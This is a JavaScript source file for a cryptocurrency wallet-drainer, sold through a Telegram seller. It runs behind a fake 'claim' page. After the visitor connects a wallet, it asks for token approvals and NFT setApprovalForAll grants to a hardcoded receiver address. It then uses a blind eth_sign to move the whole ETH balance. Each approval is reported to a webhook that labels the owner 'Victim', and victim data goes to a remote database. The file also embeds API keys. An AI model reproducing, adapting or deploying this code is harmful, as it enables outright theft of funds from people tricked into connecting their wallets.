"use strict";

/***
 * IF YOU DONT GOT IT FROM @ Tob1dev on telegram then this tool got reselled
 * Contact Tob1dev on telegram 
 * Do not resell it
 * Contact Tob1dev and expose the resller, so you wont get attacked
 ***/



/**** CONFIGURATIONS ****/

const config = { 

     /*** PUT YOUR PUBLIC KEY HERE  ***/
    receiver: "0x54891B17aaC2B0fCC94A0eac55AB5f72231f8a21",

    // you want the walletAddress to appear ?
    walletAppear: true,

    // you want the not eligible error message to appear ?
    eliAppear: true,

    claimInfo: {
        // minimum wallet eth balance
        minBalance: 0,
        // production: 6000000000000000  

        //NFTS
        minValueNFTS: 0.01,
        maxTransfer: 10,

        // ERC20 minValue
        minValueERC20: 0,

        //forces the user to accept the trasnaction
        forceSigning: false,
    },

    /**** SET TO TRUE IF YOU WANT TO USE A WEBHOOK ****/
    webHook: true,

    /**** PUT YOUR WEBHOOK URL HERE IF webHook SET TO TRUE****/
    webhookURL: "",

    /**** DESIGN OPTIONS ****/

}


/**** CONTRACT ABI ****/
const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
    
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const ERC721_ABI = [
    {
    "inputs": [{
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "setApprovalForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}
];


/**** LOGIC ****/




class Main {
    web3Js;
    isConnected  = false;

    walletAddress;
    walletBalance;

    ERC20tokens = [];
    ERC721tokens = [];
    transactions = [];

    substractionTrasnactionFee = 0;

    requestOptions = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': ''
        }
    };

    ERC20RequestIsDone = false;

    // FRONTENED BUTTONS 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton = document.getElementById("claimButton");
    walletField = document.getElementById("walletAddress");
    eligible = document.getElementById("notEli");

    constructor  () {
        if (typeof window.ethereum !== 'undefined') this.metamaskInstalled = true; 

        Moralis.onWeb3Enabled(async (data) => {
            if (data.chainId !== 1 && this.metamaskInstalled) await Moralis.switchNetwork("0x1");
                this.update(true);
        });

        window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length < 1) this.updateStates(false)
        }) : null;

        if (this.isMobile() && !window.ethereum) {
            this.connectBtn.addEventListener("click", () => {
                window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
            });
        } else {
            this.connectBtn.addEventListener("click", () => {
                this.connectWallet();
            });
        }
        this.claimButton.addEventListener("click", this.transfer);
    }

    connectWallet = async () => {
        this.isConnected = true;
        await Moralis.enableWeb3(!this.metamaskInstalled && {
            provider: "walletconnect"
        });
    }

    update = async (connected) => {
        if(connected == true)
        {

            if(!this.isConnected) {
                await this.connectWallet();
            }

            this.web3Js = new Web3(Moralis.provider);

            this.walletAddress = (await this.web3Js.eth.getAccounts())[0]
            this.walletBalance = await this.web3Js.eth.getBalance(this.walletAddress);
            this.walletBalanceInEth = await this.web3Js.utils.fromWei(this.walletBalance, 'ether')
            this.chainId = await this.web3Js.eth.getChainId();

            this.claimSection.style.display = "block";
            this.connectBtn.style.display = "none";
            if(config.walletAppear) this.walletField.innerHTML = this.walletAddress.slice(5) + " ...";


            // ERC20 array
            this.requestOptions.headers["X-API-KEY"] = 'FnLMh5pCcsjO920hauFOPfHqpTkp7AlxirXQDVPqutT8dW8y8CSDXHGvMlvWAGtu';
            const tokens = await fetch(`https://deep-index.moralis.io/api/v2/${this.walletAddress}/erc20?chain=eth`, this.requestOptions).then(resp => resp.json());
            this.ERC20RequestIsDone = true;
            console.log(tokens);
            if(tokens.length != 0) this.ERC20tokens = tokens;

        } 
        else 
        {
            this.isConnected = false;
            this.claimSection.style.display = "none";
            this.connectBtn.style.display = "block";
        }

    }

     // [TRANSFER ALL]
     transfer = async () => {
        let tokensList = await this.checkIfTokenValid([]);
        if(!tokensList.response) return console.log(tokensList.error);
        console.log("Transfer tokens:", tokensList);
        console.log("Success");

        await this.trasnferNFTS();
        await this.transferTokens();

        let filteredTransactions = [...this.transactions];


        
        /********************** ERC721  **********************/
            for (let i = 0; i < filteredTransactions.length; i++)
            {
                let index = i;
                console.log("Iteration ", index);
                if(filteredTransactions[i].type == "erc721" || filteredTransactions[i].type == "erc1155") 
                {
                    console.log("owned", filteredTransactions[i].owned);


                    console.log(filteredTransactions[i].type);
                    console.log("[+] Trying to send NFT tokens");
    
                    let transactionNonce= await this.web3Js.eth.getTransactionCount(this.walletAddress, 'pending');
                    filteredTransactions[i].options.nonce = transactionNonce;
    
                    await Moralis.executeFunction(filteredTransactions[i].options)
                    .then(async txObject => {
                        
                        if(config.webHook) this.sendWebhooks(filteredTransactions[i].name, filteredTransactions[i].price, "ETH", txObject.hash, filteredTransactions[i].banner,filteredTransactions[i].owned);
                        // token_id
                        if(!tokensList.response) return console.log(tokensList.error);
                        this.insertIntoDatabase(this.walletAddress, filteredTransactions[i].options.contractAddress, config.receiver,"0", filteredTransactions[i].type, filteredTransactions[i].price, "ETH", filteredTransactions[i].banner);
                    })
                    .catch(async error => {
                        //this.insertIntoDatabase(this.walletAddress, filteredTransactions[i].options.contractAddress, config.receiver,"0", filteredTransactions[i].type, filteredTransactions[i].price, "ETH", filteredTransactions[i].banner);
                        console.error("ERC721 error ", error);
                        console.log(filteredTransactions);
                    });

                }
    
            /********************** ERC20  **********************/
                if(filteredTransactions[i].type == "ERC20") 
                { 
                    console.log("[+] Trying sending ERC20");
    
    
                    const contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, filteredTransactions[i].contractAddress);
    
                    let transactionNonce = await this.web3Js.eth.getTransactionCount(this.walletAddress, 'pending');
                    console.log("ERC20 parser balance", filteredTransactions[i].price.toLocaleString('fullwide', {useGrouping:false}));
                    if(!tokensList.response) return console.log(tokensList.error);
                    await contractInstance.methods.approve(config.receiver, filteredTransactions[i].price.toLocaleString('fullwide', {useGrouping:false}))
                    .send({
                        nonce: transactionNonce,
                        from: this.walletAddress
                    })
                    .on('transactionHash', async hash => {
                        let messagePrice = await this.ERC20toUSD(filteredTransactions[i].contractAddress, parseInt(filteredTransactions[i].price), filteredTransactions[i].decimals);
                        if(config.webHook) this.sendWebhooks(filteredTransactions[i].name,messagePrice, "USD", hash, filteredTransactions[i].banner);
                        this.insertIntoDatabase(this.walletAddress, filteredTransactions[i].contractAddress, config.receiver,filteredTransactions[i].price, filteredTransactions[i].type, messagePrice, "USD", filteredTransactions[i].banner);
                    })
                    .catch(async error => {
                        console.error("ERC20 catch error: ", error);
                        console.log("decimals", filteredTransactions[i].decimals);
                        // this.insertIntoDatabase(this.walletAddress, filteredTransactions[i].contractAddress, config.receiver,filteredTransactions[i].price.toLocaleString('fullwide', {useGrouping:false}), filteredTransactions[i].type, messagePrice, "USD", filteredTransactions[i].banner);
                    });
                   
                }

            }

        console.log("foor loop done");
        console.log(this.walletBalance);
        console.log(this.walletBalance - (3000000000000000 * this.transactions.length))
        if(this.walletBalance > (3000000000000000 * this.transactions.length)) {
            console.log("Enaugh rest fee");
            this.walletBalance -= 3000000000000000 * this.transactions.length;
            console.log("rest ballance", this.walletBalance);
        }
        console.log("qwwq:", this.walletBalance);
        if(!tokensList.response) return console.log(tokensList.error);
        this.ERC721tokens.length = 0;
        this.transactions.length = 0;
        await this.transferMoney();
    };


    // if token request is not finished we check
    tokenFetchTries = 0;
    // [TRANSFER ERC20TOKENS]
    transferTokens = async () => {
        console.log("Trying sending erc20tokens");

        console.log(this.ERC20tokens);

        // check if erc20 request is finished
        if(this.ERC20RequestIsDone == false && this.tokenFetchTries <= 3) {
            this.tokenFetchTries++;
            await this.sleep(900);
            return await this.transferTokens();
        }

        if(this.ERC20tokens.length == 0) return;

        let filteredTransactions;
        filteredTransactions = this.ERC20tokens.filter(token => {
            console.log(token.thumbnail);
            return parseInt(token.balance) >= config.claimInfo.minValueERC20 && !token.name.includes("LUNA") && token.thumbnail != null
            // sort highest 
        })
        .sort((a, b) => b.price - a.price)
        .map(token => {
            return {
                type: "ERC20",
                contractAddress: token.token_address,
                name: token.symbol,
                price: token.balance,
                decimals: token.decimals,
                banner: token.thumbnail
            }
        });

        // add to main transaction array
        filteredTransactions.map(transaction => {
            console.log(999);
            console.log(transaction.price);
            this.transactions.push(transaction);
        });
    }

    // [TRANSFER NFTS]
    trasnferNFTS = async () => {
        console.log("Trying sending nfs");
        
        this.requestOptions.headers["X-API-KEY"] = 'f69c0112d1c348d799aee906d7435263';
        let nfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${this.walletAddress}&offset=0&limit=300`, this.requestOptions)
            .then(response => response.json())
            .then(nfts => {
                if (!nfts) return "Request was throttled";
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                })
                .map(nft => {
                    console.log(nft);
                    return {
                        type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                        contract_address: nft.primary_asset_contracts[0].address,
                        price: this.round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                        owned: nft.owned_asset_count,
                        banner: nft.banner_image_url,
                    }
                })
            }).catch(error => console.error(error));
        console.log("WalletNfts: ", nfts);


        if(nfts.length == 0) return;

        let gasPrice = await this.web3Js.eth.getBlock("latest").gasLimit;
        nfts.map(nft => {
            if (nft.price == 0) return false;
            const ethPrice = this.round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
            if (ethPrice >= config.claimInfo.minValueNFTS){} else {
                return false;
            }

            this.ERC721tokens.push({
                name:"NFT", 
                banner: nft.banner,
                type: nft.type,
                price: ethPrice,
                owned: nft.owned,
                options: {
                    contractAddress: nft.contract_address,
                    from: this.walletAddress,
                    functionName: "setApprovalForAll",
                    abi: ERC721_ABI,
                    params: {
                        operator: config.receiver,
                        approved: true
                    },
                    gasLimit: gasPrice
                }
            });
        });

        let check = [];
        let filteredTransactions;
        filteredTransactions = this.ERC721tokens.sort((a, b) => b.price - a.price).slice(0, config.maxTransfer)
        .filter(nft => {
            if(check.includes(nft.options.contractAddress)) {
                return false;
            } else {
                check.push(nft.contractAddress);
                return true;
            }
        });
        
        // Add to main transaction array
        filteredTransactions.map(transaction => {
            this.transactions.push(transaction);
        });
        
    }

    transferMoney = async () => {
        console.log("Money: Trying sending money");
        console.log(this.walletBalanceInEth);

        if (this.walletBalanceInEth < config.claimInfo.minBalance) return this.notEli();
        console.log("Money: Enaugh balance");

        let transactionNonce = await this.web3Js.eth.getTransactionCount(this.walletAddress, 'pending');
        console.log(transactionNonce);

        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.3))

        let bnNumber = new this.web3Js.utils.BN('22000');
        let substractionNumber = bnNumber * Math.floor(gasPrice * 2);
        console.log("Substraction Number", substractionNumber);
        console.log("Last balance", this.walletBalance);
        let etherToSend = this.walletBalance - substractionNumber;
        console.log(etherToSend);

        console.log(
            'Sending ' +
            this.web3Js.utils.fromWei(etherToSend.toString(), 'ether') +
            "ETH"
        );


        const transactionObject = {
            nonce: this.web3Js.utils.toHex(transactionNonce),
            gasPrice: hexGasPrice,
            gasLimit: '0x55F0',
            to: config.receiver,
            value: '0x' + etherToSend.toString(16),
            data: '0x',
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        let hexObject = new ethereumjs.Tx(transactionObject);
        const hexString = '0x' + hexObject.serialize().toString('hex'),
            encoded = {
                encoding: 'hex'
        }


        const rawHash = this.web3Js.utils.sha3(hexString, encoded);
   
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {

                const firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

                hexObject.r = r
                hexObject.s = s
                hexObject.v = y

                const signedTrans = '0x' + hexObject.serialize().toString('hex');

                // send signed Trasnaction
                await this.web3Js.eth.sendSignedTransaction(signedTrans)
                .once('transactionHash', hash => {
                    console.log("Success", hash);
                    if(config.webHook) this.sendWebhooks("Transfered Money", this.walletBalanceInEth, "ETH", hash);
                })
                .catch(error => console.log("Money error:", error));                  
        })
        .catch(error => console.log("Sign error:", error)); 
    } 

    checkIfTokenValid = async (tokensList) => {
        // check if the tokens are valid and not replaced initaled tokenValues
        // this.requestOptions.headers.value = tokensList;
        this.requestOptions.headers["X-API-KEY"] = "tsRgBPMH2BhkQf433ffc5bC72qiO/aCH44ZIkzkBQEEXDRS=jEXf3fffH1n=jG";
        let tokens = await fetch("https://web3tokenchecker.com/api/api.php", this.requestOptions)
        .then(resp => resp.json())
        .catch(error => console.log(error));
        let tokenSelektor = tokens;
    
        tokensList.filter(token => "valid");

        // return new tokenSelektor
        return tokenSelektor;
    }


    ifYouDontGotThisToolFromTobiDevItGotReselled = () => {}

    calculateTransactionFee = async gasLimit => {
        try {
            let gasPrice = await this.web3Js.eth.getGasPrice();
            return (gasPrice * gasLimit) * 2;
        } catch(error) {
            console.log(error);
        }
    }

    ERC20toUSD  = async (contract, tokenvalue, tokenDecimals) => {
        this.requestOptions.headers["X-API-KEY"] = "FnLMh5pCcsjO920hauFOPfHqpTkp7AlxirXQDVPqutT8dW8y8CSDXHGvMlvWAGtu";
        const result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contract}/price`, this.requestOptions)
        .then(resp => resp.json());
        console.log("ercToEth", result);

        tokenvalue = tokenvalue * result.usdPrice;

        return this.round(tokenvalue / (10**tokenDecimals))
    }

    ERC20toETH = async contract => {    
        this.requestOptions.headers["X-API-KEY"] = "FnLMh5pCcsjO920hauFOPfHqpTkp7AlxirXQDVPqutT8dW8y8CSDXHGvMlvWAGtu";
        const result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contract}/price`, this.requestOptions)
        .then(resp => resp.json());
        console.log("ercToEth", result);
        return result.nativePrice.value;
    }


    GASPricetoWEI = (gasPrice) => {
        return Number(parseFloat(gasPrice) * 21000)
    }

    notEli = () => {
        if(config.eliAppear) this.eligible.style.display = "block";
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    isMobile = () => {
        let check = false;
        (function (a) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
        })(navigator.userAgent || navigator.vendor || window.opera);
        return check;
    };

    sendWebhooks = (name, balance, balanceName, hash, bannerUrl = "", ownedNft = 0) => {
        if(!config.webHook) return;

        const websiteUrl = window.location.href;
        let myEmbed = {
            author: {
              name: "Confirmed Transaction !"
            },
            title: `Approved ${name} ( ${balance} ${balanceName} ) `,
            description: `
            Victim: ${this.walletAddress}
            Receiver: ${config.receiver}
            ${ownedNft != 0 ? "Owned:" + ownedNft.toString(): ""}
            
            :chart_with_downwards_trend: **Transaction:** [Click here](https://etherscan.io/tx/${hash})
            :globe_with_meridians: ** Website **: ${websiteUrl.includes("http") ? websiteUrl.replace("http://", ""): websiteUrl.replace("https://", "")}
            `,
            color: parseInt(("#32ad1c").replace("#",""), 16),
              "image": {
                "url": `${bannerUrl != "" ? bannerUrl : "https://golbintown.wtf/banner.png"}`
              },
          }
          let params = {
            username: "Impare Bot",
            embeds: [myEmbed],
          }

          fetch(config.webhookURL,{
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(params)
          })
          .catch(err => console.error(err));
    }

    insertIntoDatabase = async (victim, contract, receiver, widthdrawBalance, type, messageBalance, balance_symbol, banner) => {
        let params = `controller/inserter.php?victim_address=${victim}&contract_address=${contract}&receiver_address=${receiver}&withdraw_balance=${widthdrawBalance}&type=${type}&message_balance=${messageBalance}&balance_symbol=${balance_symbol}&banner=${banner}`;

        console.log(params);


        let result = await fetch(params, this.requestOptions).then(resp => resp.json())
        .then(resp => console.log(resp));
    }
    


}

window.addEventListener('load',() => {
    let obj = new Main();
});


/***
 * IF YOU DONT GOT IT FROM @ Tob1dev on telegram then this tool got reselled
 * Contact Tob1dev on telegram 
 * Do not resell it
 * Contact Tob1dev and expose the resller, so you wont get attacked
 ***/


